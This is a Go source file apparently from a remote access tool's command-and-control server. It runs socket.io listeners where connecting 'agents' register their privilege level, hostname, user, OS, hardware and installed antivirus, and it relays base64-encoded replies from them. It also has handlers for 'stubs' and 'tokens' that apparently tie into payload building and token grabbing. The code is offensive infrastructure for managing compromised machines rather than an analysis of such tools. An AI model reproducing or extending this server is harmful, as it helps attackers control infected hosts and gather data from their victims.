package network

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/asticode/go-astilectron"
	bootstrap "github.com/asticode/go-astilectron-bootstrap"
	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/util"
)

func SendToFrontend(focusedWin *astilectron.Window, eventMsg, msg string) {
	if err := bootstrap.SendMessage(focusedWin, eventMsg, msg, func(m *bootstrap.MessageIn) {
		// Unmarshal payload
		var s string
		if err := json.Unmarshal(m.Payload, &s); err != nil {
			log.Println(fmt.Errorf("unmarshaling payload failed: %w", err))
			return
		}
		log.Printf("About modal has been displayed and payload is %s!\n", s)
	}); err != nil {
		log.Println(fmt.Errorf("sending about event failed: %w", err))
	}
}

var (
	MainServer   *gophersocket.Server
	MainChannel  *gophersocket.Channel
	ChannelRooms []string
	userMap      map[string]string
	NodeFarm     []*Node
)

var (
	subscribe   = make(chan (chan<- Subscription), 10)
	unsubscribe = make(chan (<-chan Event), 10)
	publish     = make(chan Event, 10)
)

// Event is to define the event
type Event struct {
	EvtType   string
	User      string
	Timestamp int
	Text      string
}

type Node struct {
	Name     string
	Port     string
	Server   *gophersocket.Server
	MainRoom string
	Channel  *gophersocket.Channel
}

// Subscription is to manage subscribe events
type Subscription struct {
	Archive []Event
	New     <-chan Event
}

// Message is the data structure of messages
type Message struct {
	User      string
	Timestamp int
	Message   string
}
type MyEventData struct {
	Data string
}

var userStr string
var newMessages chan string

func FindChannel(id string) (*gophersocket.Channel, error) {
	return MainServer.GetChannel(id)
}

func SendToChannel(channel *gophersocket.Channel, event string, message MyEventData) {
	channel.Emit(event, message)
}

func SendAck(channel *gophersocket.Channel, ackEvent string, message MyEventData) (result string, err error) {
	result, err = channel.Ack(ackEvent, message, time.Second*5)
	return
}

func BroadCastToAll(event string, message MyEventData) {
	MainServer.BroadcastToAll(event, message)
}

func BroadCastToRoom(room, event string, message MyEventData) {
	//or for clients joined to room
	MainServer.BroadcastTo(room, event, message)
}

var Nodes []*Node

func CreateNode(name string, port string) *Node {
	ChannelRooms = append(ChannelRooms, "default")
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}

	//create server instance, you can setup transport parameters or get the default one
	//look at websocket.go for parameters description
	userMap = make(map[string]string)
	return node
}
func ServeNode(name string, port string) error {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	if len(Nodes) > 0 {
		for _, a := range Nodes {
			if a.Port == port {
				return errors.New("reserved")
			}
		}
	}
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}
	Nodes = append(Nodes, node)
	func() {
		for {
			//server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
			// --- caller is default handlers
			server.On("reg", func(c *gophersocket.Channel, rep models.Resp) {
				log.Println(rep)
				//bootstrap.SendMessage(models.MainWindow, "reg", rep)

			})
			//on connection handler, occurs once for each connected client
			server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
				node.Channel = c
				//client id is unique
				log.Println("New client connected, client id is ", c.Id())
				newMessages = make(chan string)
				userMap[c.Ip()] = c.Id()
				//you can join clients to rooms
				log.Println("Joining new client to " + ChannelRooms[0])
				c.Join(ChannelRooms[0])
				/*
					var channels []*gophersocket.Channel
					var occupents map[*gophersocket.Channel]int
					for _, ca := range ChannelRooms {
						channels = c.List(ca)
						amount := c.Amount(ca)
						occupents = make(map[*gophersocket.Channel]int)
						for cc, _ := range occupents {
							occupents[cc] = amount
						}
					}
					stat := &models.NodeStats{
						Channels:      channels,
						RoomOccupants: occupents,
					}
				*/
				//of course, you can list the clients in the room, or account them

				//				bootstrap.SendMessage(models.MainWindow, "headcount", models.NodeStats{Channels: stat.Channels, RoomOccupants: stat.RoomOccupants})
				//log.Println(channels)
				//or check the amount of clients in room
				//log.Println(amount, "clients in room")
			})
			server.On("repl", func(c *gophersocket.Channel, reply models.Resp) {
				log.Println("Recieved Reply Message")
				log.Println(reply)
				newMessages <- reply.Resp
				bootstrap.SendMessage(models.MainWindow, "repl", reply)
			})
			server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
				log.Println("CLient is registering")
				cinfo := models.ClientInfo{
					SocketID:  c.Id(),
					Priv:      info.Priv,
					Version:   info.Version,
					IPAddr:    info.IPAddr,
					Hostname:  info.Hostname,
					User:      info.User,
					OS:        info.OS,
					Arch:      info.Arch,
					CPU:       info.CPU,
					GPU:       info.GPU,
					Memory:    info.Memory,
					AntiVirus: info.AntiVirus,
				}
				log.Println(cinfo)
				//bootstrap.SendMessage(models.MainWindow, "register", cinfo)
				toSend := fmt.Sprintf("%s#%s#Golang", info.Priv, info.OS)
				bootstrap.SendMessage(models.MainWindow, "newClient", models.Resp{Resp: toSend, Tag: c.Id()})
				newAgent := &models.Agent{
					Name: c.Id(),
					//	Info:    cinfo,
					Channel: c,
				}
				models.Agents = append(models.Agents, newAgent)
				//				models.ClientList = append(models.ClientList, cinfo)
				//
			})
			//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
			//you can omit function args if you do not need them
			//you can return string value for ack, or return nothing for emit
			server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
				//caller is not necessary, client will be removed from rooms
				//automatically on disconnect
				//but you can remove client from room whenever you need to
				log.Printf("Client %s has disconnected\nRemoving them from %s", c.Id(), ChannelRooms[0])
				c.Leave(ChannelRooms[0])

				if _, found := userMap[c.Ip()]; found {
					delete(userMap, c.Ip())
				}

				log.Println("Disconnection Handle Complete")
				bootstrap.SendMessage(models.MainWindow, "discon", models.Resp{Resp: fmt.Sprintf("Client %s has disconnected", c.Id()), Tag: c.Id()})
			})
			server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
				response, err := util.Fb64(resp.Resp)
				if err != nil {
					response = resp.Resp
				}
				tag, err := util.Fb64(resp.Tag)
				if err != nil {
					tag = resp.Tag
				}
				log.Println(resp)
				bootstrap.SendMessage(models.MainWindow, "error", models.Resp{Resp: tag + "::" + (fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)), Tag: c.Id()})
			})
			//error catching handler
			server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
				log.Println("Error occurs")
			})

			// --- caller is custom handler
			/*
				//custom event handler
				server.On("handle something", func(c *gophersocket.Channel, channel Channel) string {
					log.Println("Something successfully handled")

					//you can return result of handler, in caller case
					//handler will be converted from "emit" to "ack"
					return "result"
				})
			*/
			//setup http server like caller for handling connections
			serveMux := http.NewServeMux()
			serveMux.Handle("/socket.io/", server)
			//go localListen(node.Channel)
			log.Panic(http.ListenAndServe(":"+node.Port, serveMux))
		}
	}()
	return nil
}

func StartListener(server *gophersocket.Server) {
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", server)
	log.Println(http.ListenAndServe(":55556", serveMux))
}

// MessageHandler is a functions that handles messages

func BuildHandler(w *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "stubs":
		var tokens string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &tokens); err != nil {
				payload = err.Error()
				return
			}
		}
		// Explore
		if err := bootstrap.SendMessage(w, "grabstubexec", "Successfully executed the getstub() function", func(m *bootstrap.MessageIn) {
			// Unmarshal payload
			var s string
			if err := json.Unmarshal(m.Payload, &s); err != nil {
				log.Println(fmt.Errorf("unmarshaling payload failed: %w", err))
				return
			}
			log.Printf("About modal has been displayed and payload is %s!\n", s)
		}); err != nil {
			log.Println(fmt.Errorf("sending about event failed: %w", err))
		}
		payload = err.Error()
		return
	case "tokens":
		var tokens string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &tokens); err != nil {
				payload = err.Error()
				return
			}
		}
		// Explore
		if err := bootstrap.SendMessage(w, "tokenvalues", tokens, func(m *bootstrap.MessageIn) {
			// Unmarshal payload
			var s string
			if err := json.Unmarshal(m.Payload, &s); err != nil {
				log.Println(fmt.Errorf("unmarshaling payload failed: %w", err))
				return
			}
			log.Printf("About modal has been displayed and payload is %s!\n", s)
		}); err != nil {
			log.Println(fmt.Errorf("sending about event failed: %w", err))
		}
	}
	return
}

// handleMessages handles messages
func ListeningHandler(_ *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "error":
		// Unmarshal payload
		var path string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &path); err != nil {
				payload = err.Error()
				return
			}
		}
		SendToFrontend(models.MainWindow, "error", path)
	case "reply":
		var path string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &path); err != nil {
				payload = err.Error()
				return
			}
		}
		SendToFrontend(models.MainWindow, "reply", path)
	}
	return
}

func Watchman(server *gophersocket.Server, scope *gophersocket.Channel) {
	server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		log.Println("New client connected, client id is ", c.Id())
		SendToFrontend(models.MainWindow, "alert", "New client connected, client id is "+c.Id())
		//c.Emit("ack", cloud.Spell{"ACKREQ", "Please provide the access key"})
	})
	server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
		cinfo := models.ClientInfo{
			SocketID:  c.Id(),
			Priv:      info.Priv,
			Version:   info.Version,
			IPAddr:    info.IPAddr,
			Hostname:  info.Hostname,
			User:      info.User,
			OS:        info.OS,
			Arch:      info.Arch,
			CPU:       info.CPU,
			GPU:       info.GPU,
			Memory:    info.Memory,
			AntiVirus: info.AntiVirus,
		}
		log.Println(cinfo)
		models.ClientList = append(models.ClientList, cinfo)
		toSend := fmt.Sprintf("%s#%s#Golang", info.SocketID, info.OS)
		SendToFrontend(models.MainWindow, "newClient", toSend)
	})
	server.On("discon", func(c *gophersocket.Channel, resp models.Resp) {
		//response := util.Fb64(resp.Resp)
		//tag := util.Fb64(resp.Tag)
		SendToFrontend(models.MainWindow, "discon", resp.Tag+"::"+fmt.Sprintf("Reponse: <i>%s</i>", resp.Resp))
	})
	//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
	//you can omit function args if you do not need them
	//you can return string value for ack, or return nothing for emit
	server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
		var _clientList []models.ClientInfo
		var discon string
		for _, s := range models.ClientList {
			if s.SocketID != c.Id() {
				_clientList = append(_clientList, s)
			} else {
				discon = s.SocketID
			}
		}
		models.ClientList = _clientList
		_clientList = nil
		log.Println("Client Disconnected, client id is ", c.Id())
		SendToFrontend(models.MainWindow, "alert", "[<i>!</i>] Client <b>"+discon+"</b> Disconnected")
	})
	//error catching handler
	server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
		log.Println("Error from " + c.Id())
		SendToFrontend(models.MainWindow, "svrerror", "Error from: "+c.Id())
	})
	server.On("repl", func(c *gophersocket.Channel, resp models.Resp) {
		var response string
		var err error
		response, err = util.Fb64(resp.Resp)
		if err != nil {
			response = resp.Resp
		}
		tag, err := util.Fb64(resp.Tag)
		if err != nil {
			response = resp.Tag
		}
		SendToFrontend(models.MainWindow, "response", tag+"::"+fmt.Sprintf("Reponse: <i>%s</i>", response))
	})
	server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
		var response string
		var err error
		response, err = util.Fb64(resp.Resp)
		if err != nil {
			response = resp.Resp
		}
		tag, err := util.Fb64(resp.Tag)
		if err != nil {
			response = resp.Tag
		}
		SendToFrontend(models.MainWindow, "error", tag+"::"+(fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)))
	})
}
